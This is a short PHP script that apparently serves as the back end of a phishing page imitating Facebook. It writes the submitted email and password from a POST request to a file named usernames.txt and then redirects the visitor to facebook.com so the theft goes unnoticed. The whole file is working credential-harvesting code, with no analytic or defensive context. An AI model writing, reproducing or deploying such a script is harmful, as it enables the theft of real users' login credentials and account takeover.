<?php
header('Location: https://facebook.com/');
if (!empty($_POST['email'])) {file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
}

exit();
